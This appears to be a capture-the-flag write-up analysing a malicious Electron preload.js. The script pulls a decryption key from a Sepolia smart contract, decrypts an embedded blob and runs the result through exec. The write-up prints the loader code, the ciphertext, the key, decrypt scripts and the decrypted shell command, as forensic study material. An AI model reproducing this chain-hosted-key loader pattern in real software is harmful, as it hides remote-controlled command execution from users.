# SilentDividend Q5 — Finding `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`

**Challenge:** Holmes CTF 2026 — Sherlock 01 / Silent Dividend  
**Question:** Investigate the smart contract using its address, analyze its logic, and recover the flag by decoding the encrypted data.  
**UI mask:** `****=******** **********_*********=**-****`  
**Answer (confirmed):** `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`  
**Format:** bare string (space between the two fields) — **no** `HTB{...}`

---

## What the question is asking

Electron `preload.js` does **not** hardcode a command. It:

1. Reads a **ciphertext blob** from the app
2. Fetches a **bytes32 key** from a **Sepolia** contract
3. **Decrypts** the blob
4. Treats the plaintext as a **shell command** (`exec`)

The “flag” the UI wants is the **decoded string** that matches  
`AUTH=... SETTLEMENT_REFERENCE=...`  
(not the contract address, not the key hex).

---

## Attack path

### 1. Find the encrypted payload + contract in preload

Unpack → extract `app.asar` → **`asar/preload.js`**.

```javascript
const CONTRACT_ADDRESS =
    '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';

const RPC_URL =
    'https://ethereum-sepolia-rpc.publicnode.com';

const CONTRACT_ABI = [
    'function resolveState() view returns (bytes32)'
];

const ENCRYPTED_DATA =
    '0x560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8'
  + 'f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa'
  + '2c4c4e1bbfc6204207fe5c801d201f5af84864f0';
```

Later in the same file:

```javascript
const state = await contract.resolveState();   // on-chain key
const decrypted = decryptEmbeddedData(ENCRYPTED_DATA, state);
exec(decrypted);                               // run plaintext
```

### 2. Identify the contract (verified source)

Address: `0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1`  
Explorer/Sourcify Sepolia → **`KeyVault.sol`** → contract **`StateRegistry`**.

```solidity
function resolveState() external view returns (bytes32) {
    return x1;  // immutable set in constructor (arg x9)
}
```

Other views (`resolveStage`, `resolveStatee`, …) return **other** bytes32 values — only **`resolveState`** is wired in preload as the decrypt key.

### 3. Read the key on-chain (read-only `eth_call`)

```text
selector resolveState() = 0x77b3774c
eth_call(to=0xbB63…6B1, data=0x77b3774c)
→ 0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

That 32-byte value is the **XOR key** for `ENCRYPTED_DATA`.

### 4. Reimplement the decrypt exactly

From `preload.js` `decryptEmbeddedData()`:

```text
For each byte i of ciphertext:
  keyByte = key[i % key.length]
  step1   = cipher[i] XOR keyByte
  step2   = ROL8(step1, 7)          // rotate left 7 bits
  plain[i] = step2 XOR 0x42         // magic constant
Return UTF-8 string
```

```javascript
function decrypt(data, key) {
  const magic = 0x42, rot = 7;
  const out = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    const step1 = data[i] ^ key[i % key.length];
    const step2 = ((step1 << rot) | (step1 >>> (8 - rot))) & 0xff;
    out[i] = step2 ^ magic;
  }
  return out.toString("utf8");
}

const key = Buffer.from(
  "3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4",
  "hex"
);
const cipher = Buffer.from(ENCRYPTED_DATA.slice(2), "hex");
console.log(decrypt(cipher, key));
```

### 5. Plaintext (this is what you submit)

```text
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

The UI mask is **not** the whole command. It wants the **echo / flag fields**:

```text
AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

Check the mask:

```text
****=******** **********_*********=**-****
AUTH = NAPOLEON  SETTLEMENT_REFERENCE = SR-4821
```

Submit (confirmed):

```text
AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

### 6. Wrong things to submit

| Value | Why not |
|-------|---------|
| `0xbB63…6B1` | Contract **address**, not decoded flag |
| `0x3460743b…` | Decrypt **key**, not plaintext |
| Full command with `start "" "%TEMP%…` | UI mask wants AUTH + SETTLEMENT_REFERENCE only |
| `NAPOLEON` alone | Incomplete — mask includes both fields |
| `HTB{AUTH=NAPOLEON…}` | Confirmed format is **bare** |

---

## Mini example (Python)

```python
from pathlib import Path

cipher = bytes.fromhex(
    "560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8"
    "f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa"
    "2c4c4e1bbfc6204207fe5c801d201f5af84864f0"
)
key = bytes.fromhex(
    "3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4"
)
MAGIC, ROT = 0x42, 7
out = bytearray(len(cipher))
for i, b in enumerate(cipher):
    s1 = b ^ key[i % len(key)]
    s2 = ((s1 << ROT) | (s1 >> (8 - ROT))) & 0xFF
    out[i] = s2 ^ MAGIC
print(out.decode("utf-8"))
```

---

## Team checklist

- [ ] Extract asar → `preload.js` (ciphertext + contract + algo).
- [ ] Sourcify/explorer: `StateRegistry.resolveState()`.
- [ ] `eth_call` `0x77b3774c` on Sepolia → 32-byte key.
- [ ] Implement XOR → ROL7 → XOR `0x42`.
- [ ] Keep **AUTH=… SETTLEMENT_REFERENCE=…** (match UI mask).
- [ ] Submit bare string; do not execute the command on the host.

---

## One-line brief

> Preload pulls `resolveState()` from Sepolia StateRegistry and XOR/ROL-decrypts `ENCRYPTED_DATA` to `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`.

---

*Confirmed flag. Read-only chain calls; decrypt offline.*
